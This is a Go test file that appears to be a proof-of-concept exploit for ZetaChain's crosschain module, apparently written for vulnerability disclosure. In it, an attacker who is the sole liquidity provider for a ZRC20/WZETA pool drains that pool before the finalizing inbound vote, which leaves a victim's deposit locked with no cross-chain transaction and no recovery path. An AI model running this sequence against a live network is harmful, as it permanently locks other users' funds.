package keeper_test

import (
	"math/big"
	"testing"

	sdkmath "cosmossdk.io/math"
	sdk "github.com/cosmos/cosmos-sdk/types"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	evmkeeper "github.com/cosmos/evm/x/vm/keeper"
	"github.com/ethereum/go-ethereum/accounts/abi"
	ethcommon "github.com/ethereum/go-ethereum/common"
	"github.com/holiman/uint256"
	"github.com/stretchr/testify/require"

	"github.com/zeta-chain/node/pkg/coin"
	iuniswapv2erc20 "github.com/zeta-chain/node/pkg/contracts/uniswap/v2-core/contracts/interfaces/iuniswapv2erc20.sol"
	iuniswapv2factory "github.com/zeta-chain/node/pkg/contracts/uniswap/v2-core/contracts/interfaces/iuniswapv2factory.sol"
	uniswapv2router02 "github.com/zeta-chain/node/pkg/contracts/uniswap/v2-periphery/contracts/uniswapv2router02.sol"
	keepertest "github.com/zeta-chain/node/testutil/keeper"
	"github.com/zeta-chain/node/testutil/sample"
	"github.com/zeta-chain/node/x/crosschain/keeper"
	crosschaintypes "github.com/zeta-chain/node/x/crosschain/types"
	fungiblekeeper "github.com/zeta-chain/node/x/fungible/keeper"
	fungibletypes "github.com/zeta-chain/node/x/fungible/types"
	observertypes "github.com/zeta-chain/node/x/observer/types"
)

// TestPOC2_VoteInbound_LiquidityDrain_VictimFundsLocked
//
// Clean proof:
//  1. gasZRC20 is registered as sender-chain gas coin.
//  2. assetZRC20 is the victim ERC20 asset.
//  3. Attacker is sole LP for assetZRC20/WZETA.
//  4. Pre-attack quote assetZRC20 -> gasZRC20 succeeds.
//  5. Attacker removes LP; quote fails via getAmountsIn.
//  6. Final VoteInbound finalizes ballot first, then fails during gas quote.
//  7. End state: finalized ballot, no CCTX, no finalized inbound marker,
//     tracker remains, retry/refund/abort cannot recover.
func TestPOC2_VoteInbound_LiquidityDrain_VictimFundsLocked(t *testing.T) {
	k, ctx, sdkKeepers, zk := keepertest.CrosschainKeeper(t)
	msgServer := keeper.NewMsgServerImpl(*k)
	fk := zk.FungibleKeeper

	senderChain := getValidEthChain()
	receiverChain := int64(0)
	for _, ch := range zk.ObserverKeeper.GetSupportedChains(ctx) {
		if ch.IsExternalChain() && ch.ChainId != senderChain.ChainId {
			receiverChain = ch.ChainId
			break
		}
	}
	require.NotZero(t, receiverChain)

	// CrosschainKeeper test setup does not register fungible module account.
	if sdkKeepers.AuthKeeper.GetModuleAccount(ctx, fungibletypes.ModuleName) == nil {
		macc := authtypes.NewEmptyModuleAccount(fungibletypes.ModuleName, authtypes.Minter, authtypes.Burner)
		sdkKeepers.AuthKeeper.SetModuleAccount(ctx, macc)
	}

	deploySystemContracts(t, ctx, fk, sdkKeepers.EvmKeeper)

	// gasZRC20 is the registered gas coin for senderChain.
	gasZRC20 := setupGasCoin(
		t,
		ctx,
		fk,
		sdkKeepers.EvmKeeper,
		senderChain.ChainId,
		"gasERC20",
		"gERC20",
	)

	// assetZRC20 is the victim ERC20 asset.
	sourceERC20 := sample.EthAddress().Hex()
	_ = setupGasCoin(
		t,
		ctx,
		fk,
		sdkKeepers.EvmKeeper,
		receiverChain,
		"receiverGas",
		"rGas",
	)

	assetZRC20 := deployZRC20(
		t,
		ctx,
		fk,
		sdkKeepers.EvmKeeper,
		receiverChain,
		"victimERC20",
		sourceERC20,
		"vERC20",
	)

	gasCoin, found := fk.GetGasCoinForForeignCoin(ctx, senderChain.ChainId)
	require.True(t, found, "gas coin must be registered")
	require.Equal(t, gasZRC20.Hex(), gasCoin.Zrc20ContractAddress)

	assetCoin, found := fk.GetForeignCoins(ctx, assetZRC20.Hex())
	require.True(t, found, "victim ERC20 foreign coin must be registered")
	require.Equal(t, assetZRC20.Hex(), assetCoin.Zrc20ContractAddress)

	validators := setObservers(t, k, ctx, zk)
	zk.ObserverKeeper.SetTSS(ctx, sample.Tss())

	setSupportedChain(ctx, zk, senderChain.ChainId, receiverChain)

	k.SetGasPrice(ctx, crosschaintypes.GasPrice{
		Creator:     sample.AccAddress(),
		ChainId:     senderChain.ChainId,
		Signers:     validators,
		BlockNums:   []uint64{1},
		Prices:      []uint64{1},
		MedianIndex: 0,
	})

	k.SetGasPrice(ctx, crosschaintypes.GasPrice{
		Creator:     sample.AccAddress(),
		ChainId:     receiverChain,
		Signers:     validators,
		BlockNums:   []uint64{1},
		Prices:      []uint64{1},
		MedianIndex: 0,
	})

	// Attacker is a normal external ZEVM address and becomes sole LP for assetZRC20/WZETA.
	attackerAddr := ethcommon.HexToAddress("0xDeaDBeefDeaDBeefDeaDBeefDeaDBeefDeaDBeef")
	attackerLiquidity := big.NewInt(1e17)

	addLiquidityFromPOC2(
		t,
		ctx,
		fk,
		sdkKeepers.EvmKeeper,
		attackerAddr,
		assetZRC20,
		attackerLiquidity,
	)

	wzetaAddr, err := fk.GetWZetaContractAddress(ctx)
	require.NoError(t, err)

	assetPairAddr := getPairAddressPOC2(t, ctx, fk, assetZRC20, wzetaAddr)
	attackerLP := getLPBalancePOC2(t, ctx, fk, assetPairAddr, attackerAddr)
	require.True(t, attackerLP.Sign() > 0, "attacker must own LP tokens")
	t.Logf("[ATTACKER] asset/WZETA LP balance = %s", attackerLP)

	gasParams, err := k.ChainGasParams(ctx, senderChain.ChainId)
	require.NoError(t, err)
	require.Equal(t, gasZRC20, gasParams.GasZRC20)

	outTxGasFee := gasParams.GasLimit.Mul(gasParams.GasPrice).Add(gasParams.ProtocolFlatFee)

	feePreAttack, err := fk.QueryUniswapV2RouterGetZRC4ToZRC4AmountsIn(
		ctx,
		outTxGasFee.BigInt(),
		assetZRC20,
		gasParams.GasZRC20,
	)
	require.NoError(t, err, "assetZRC20 -> gasZRC20 quote must work before drain")
	t.Logf("[PRE-ATTACK] feeInAssetZRC20=%s", feePreAttack)

	victimAmount := sdkmath.NewUintFromBigInt(new(big.Int).Add(feePreAttack, big.NewInt(1_000_000)))

	msg := &crosschaintypes.MsgVoteInbound{
		Creator:            validators[0],
		Sender:             sample.EthAddress().Hex(),
		SenderChainId:      senderChain.ChainId,
		TxOrigin:           sample.EthAddress().Hex(),
		Receiver:           sample.EthAddress().Hex(),
		ReceiverChain:      receiverChain,
		Amount:             victimAmount,
		Message:            "",
		InboundHash:        "0x3333333333333333333333333333333333333333333333333333333333333333",
		InboundBlockHeight: 100,
		CallOptions: &crosschaintypes.CallOptions{
			GasLimit: 1_000_000,
		},
		CoinType:                coin.CoinType_ERC20,
		Asset:                   sourceERC20,
		EventIndex:              1,
		ProtocolContractVersion: crosschaintypes.ProtocolContractVersion_V2,
		RevertOptions:           crosschaintypes.NewEmptyRevertOptions(),
		Status:                  crosschaintypes.InboundStatus_SUCCESS,
		ConfirmationMode:        crosschaintypes.ConfirmationMode_SAFE,
	}

	k.SetInboundTracker(ctx, crosschaintypes.InboundTracker{
		ChainId:  msg.SenderChainId,
		TxHash:   msg.InboundHash,
		CoinType: msg.CoinType,
	})

	// Keeper test has one real staking validator; next vote is the finalizing vote.
	t.Log("[PRE-ATTACK] next validator vote finalizes the ballot")

	// Attacker removes sole asset/WZETA LP, breaking assetZRC20 -> gasZRC20 quote.
	drainAllLPPOC2(t, ctx, fk, attackerAddr, assetZRC20, assetPairAddr)

	_, err = fk.QueryUniswapV2RouterGetZRC4ToZRC4AmountsIn(
		ctx,
		outTxGasFee.BigInt(),
		assetZRC20,
		gasParams.GasZRC20,
	)
	require.Error(t, err, "quote must fail after attacker drains asset/WZETA liquidity")
	require.Contains(t, err.Error(), "getAmountsIn")
	t.Logf("[POST-DRAIN] quote failed as expected: %v", err)

	finalVote := *msg
	finalVote.Creator = validators[0]

	_, finalErr := msgServer.VoteInbound(ctx, &finalVote)
	require.Error(t, finalErr, "final vote must fail because gas quote fails after ballot finalization")
	t.Logf("[FINAL VOTE] failed through gas quote as expected: %v", finalErr)

	ballot, found := zk.ObserverKeeper.GetBallot(ctx, msg.Digest())
	require.True(t, found)
	require.Equal(
		t,
		observertypes.BallotStatus_BallotFinalized_SuccessObservation,
		ballot.BallotStatus,
	)

	_, found = k.GetCrossChainTx(ctx, msg.Digest())
	require.False(t, found, "CCTX must not exist")

	require.False(t, k.IsFinalizedInbound(ctx, msg.InboundHash, msg.SenderChainId, msg.EventIndex))

	_, trackerFound := k.GetInboundTracker(ctx, msg.SenderChainId, msg.InboundHash)
	require.True(t, trackerFound)

	// Restore liquidity; retry still cannot recover because ballot is finalized.
	addLiquidityFromPOC2(
		t,
		ctx,
		fk,
		sdkKeepers.EvmKeeper,
		attackerAddr,
		assetZRC20,
		attackerLiquidity,
	)

	_, err = fk.QueryUniswapV2RouterGetZRC4ToZRC4AmountsIn(
		ctx,
		outTxGasFee.BigInt(),
		assetZRC20,
		gasParams.GasZRC20,
	)
	require.NoError(t, err, "quote works again after liquidity restore")

	retryVote := *msg
	retryVote.Creator = validators[0]

	_, retryErr := msgServer.VoteInbound(ctx, &retryVote)
	require.Error(t, retryErr, "retry must fail because ballot is already finalized")

	_, found = k.GetCrossChainTx(ctx, msg.Digest())
	require.False(t, found, "CCTX must still not exist after retry")

	_, abortErr := msgServer.AbortStuckCCTX(ctx, &crosschaintypes.MsgAbortStuckCCTX{
		Creator:   sample.AccAddress(),
		CctxIndex: msg.Digest(),
	})
	require.Error(t, abortErr, "AbortStuckCCTX cannot work without CCTX")

	_, refundErr := msgServer.RefundAbortedCCTX(ctx, &crosschaintypes.MsgRefundAbortedCCTX{
		Creator:       sample.AccAddress(),
		CctxIndex:     msg.Digest(),
		RefundAddress: sample.EthAddress().Hex(),
	})
	require.Error(t, refundErr, "RefundAbortedCCTX cannot work without CCTX")

	t.Log("POC PASSED: liquidity-drain gas quote failure finalizes ballot without CCTX/recovery")
}

func addLiquidityFromPOC2(
	t *testing.T,
	ctx sdk.Context,
	fk *fungiblekeeper.Keeper,
	evmk *evmkeeper.Keeper,
	lpOwner ethcommon.Address,
	zrc20Addr ethcommon.Address,
	liquidityAmount *big.Int,
) {
	t.Helper()

	routerAddr, err := fk.GetUniswapV2Router02Address(ctx)
	require.NoError(t, err)

	routerABI, err := uniswapv2router02.UniswapV2Router02MetaData.GetAbi()
	require.NoError(t, err)

	_, err = fk.DepositZRC20(ctx, zrc20Addr, lpOwner, liquidityAmount)
	require.NoError(t, err)

	evmBalance, overflow := uint256.FromBig(liquidityAmount)
	require.False(t, overflow)
	require.NoError(t, evmk.SetBalance(ctx, lpOwner, evmBalance))

	err = fk.CallZRC20Approve(ctx, lpOwner, zrc20Addr, routerAddr, liquidityAmount, false)
	require.NoError(t, err)

	_, err = fk.CallEVM(
		ctx,
		*routerABI,
		lpOwner,
		routerAddr,
		liquidityAmount,
		big.NewInt(5_000_000),
		true,
		false,
		"addLiquidityETH",
		zrc20Addr,
		liquidityAmount,
		fungiblekeeper.BigIntZero,
		fungiblekeeper.BigIntZero,
		lpOwner,
		big.NewInt(1e17),
	)
	require.NoError(t, err)
}

func drainAllLPPOC2(
	t *testing.T,
	ctx sdk.Context,
	fk *fungiblekeeper.Keeper,
	lpOwner ethcommon.Address,
	zrc20Addr ethcommon.Address,
	pairAddr ethcommon.Address,
) {
	t.Helper()

	lpBalance := getLPBalancePOC2(t, ctx, fk, pairAddr, lpOwner)
	require.True(t, lpBalance.Sign() > 0, "LP owner must hold LP tokens")

	routerAddr, err := fk.GetUniswapV2Router02Address(ctx)
	require.NoError(t, err)

	routerABI, err := uniswapv2router02.UniswapV2Router02MetaData.GetAbi()
	require.NoError(t, err)

	pairABI, err := getPairABIPOC2()
	require.NoError(t, err)

	_, err = fk.CallEVM(
		ctx,
		*pairABI,
		lpOwner,
		pairAddr,
		fungiblekeeper.BigIntZero,
		nil,
		true,
		false,
		"approve",
		routerAddr,
		lpBalance,
	)
	require.NoError(t, err)

	_, err = fk.CallEVM(
		ctx,
		*routerABI,
		lpOwner,
		routerAddr,
		fungiblekeeper.BigIntZero,
		big.NewInt(5_000_000),
		true,
		false,
		"removeLiquidityETH",
		zrc20Addr,
		lpBalance,
		fungiblekeeper.BigIntZero,
		fungiblekeeper.BigIntZero,
		lpOwner,
		big.NewInt(1e17),
	)
	require.NoError(t, err)
}

func getPairAddressPOC2(
	t *testing.T,
	ctx sdk.Context,
	fk *fungiblekeeper.Keeper,
	tokenA ethcommon.Address,
	tokenB ethcommon.Address,
) ethcommon.Address {
	t.Helper()

	factoryAddr, err := fk.GetUniswapV2FactoryAddress(ctx)
	require.NoError(t, err)

	factoryABI, err := iuniswapv2factory.IUniswapV2FactoryMetaData.GetAbi()
	require.NoError(t, err)

	res, err := fk.CallEVM(
		ctx,
		*factoryABI,
		fungibletypes.ModuleAddressEVM,
		factoryAddr,
		fungiblekeeper.BigIntZero,
		nil,
		false,
		false,
		"getPair",
		tokenA,
		tokenB,
	)
	require.NoError(t, err)

	out, err := factoryABI.Unpack("getPair", res.Ret)
	require.NoError(t, err)

	pair := out[0].(ethcommon.Address)
	require.NotEqual(t, ethcommon.Address{}, pair)

	return pair
}

func getLPBalancePOC2(
	t *testing.T,
	ctx sdk.Context,
	fk *fungiblekeeper.Keeper,
	pairAddr ethcommon.Address,
	holder ethcommon.Address,
) *big.Int {
	t.Helper()

	pairABI, err := getPairABIPOC2()
	require.NoError(t, err)

	res, err := fk.CallEVM(
		ctx,
		*pairABI,
		fungibletypes.ModuleAddressEVM,
		pairAddr,
		fungiblekeeper.BigIntZero,
		nil,
		false,
		false,
		"balanceOf",
		holder,
	)
	require.NoError(t, err)

	out, err := pairABI.Unpack("balanceOf", res.Ret)
	require.NoError(t, err)

	return out[0].(*big.Int)
}

func getPairABIPOC2() (*abi.ABI, error) {
	return iuniswapv2erc20.IUniswapV2ERC20MetaData.GetAbi()
}
